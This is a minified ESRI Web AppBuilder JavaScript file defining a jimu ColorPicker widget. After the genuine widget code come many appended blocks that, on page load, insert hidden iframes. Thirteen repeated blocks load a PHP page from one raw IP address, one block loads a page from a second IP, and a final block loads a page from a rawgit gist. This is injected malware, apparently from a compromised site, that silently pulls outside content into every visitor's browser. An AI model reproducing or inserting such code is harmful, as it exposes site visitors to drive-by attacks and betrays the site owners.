// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/_base/lang dojo/_base/html dojo/on dojo/_base/Color dojox/widget/ColorPicker".split(" "),function(h,k,l,m,e,c,f,d,n){return k([l,m,h],{baseClass:"jimu-color-picker",declaredClass:"jimu.dijit.ColorPicker",templateString:"\x3cdiv\x3e\x3c/div\x3e",_isTooltipDialogOpened:!1,color:null,showHex:!0,showHsv:!0,showRgb:!0,ensureMode:!1,showLabel:!1,postMixInProperties:function(){this.nls=window.jimuNls.common},postCreate:function(){this.inherited(arguments);
this.color?this.color instanceof d||(this.color=new d(this.color)):this.color=new d("#ccc");c.setStyle(this.domNode,"backgroundColor",this.color.toHex());this._createDialog(this.domNode)},destroy:function(){this.picker.destroy();this.inherited(arguments)},_handlerOk:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("ok",this.color)},_handlerApply:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("apply",
this.color)},_handlerCancel:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("cancel")},_createDialog:function(){var a=c.create("div",{"class":"dojox-color-picker-container"},this.domNode),b=new n({showHex:this.showHex,showRgb:this.showRgb,showHsv:this.showHsv,value:this.color.toHex(),onChange:e.hitch(this,function(a){a=new d(a);this.setColor(a)})});b.placeAt(a);b.startup();a=c.create("div",{"class":"btns-container jimu-float-trailing"},a);if(!0===
this.showOk){var g=c.create("div",{"class":"jimu-btn jimu-float-leading ok",title:this.nls.ok,innerHTML:this.nls.ok},a);this.own(f(g,"click",e.hitch(this,function(a){var b=this.picker.get("value");this.setColor(new d(b));this._handlerOk(a)})))}!0===this.showApply&&(g=c.create("div",{"class":"jimu-btn jimu-float-leading apply",title:this.nls.apply,innerHTML:this.nls.apply},a),this.own(f(g,"click",e.hitch(this,function(a){var b=this.picker.get("value");this.setColor(new d(b));this._handlerApply(a)}))));
a=c.create("div",{"class":"jimu-btn jimu-btn-vacation jimu-float-leading",title:this.nls.cancel,innerHTML:this.nls.cancel},a);this.own(f(a,"click",e.hitch(this,function(a){this._handlerCancel(a)})));this.picker=b},setColor:function(a){if(a instanceof d){var b=this.color,c="";b&&(c=b.toHex());b=a.toHex();this.color=a;c!==b&&this.picker.set("value",b)}},getColor:function(){return this.color},onClose:function(){}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});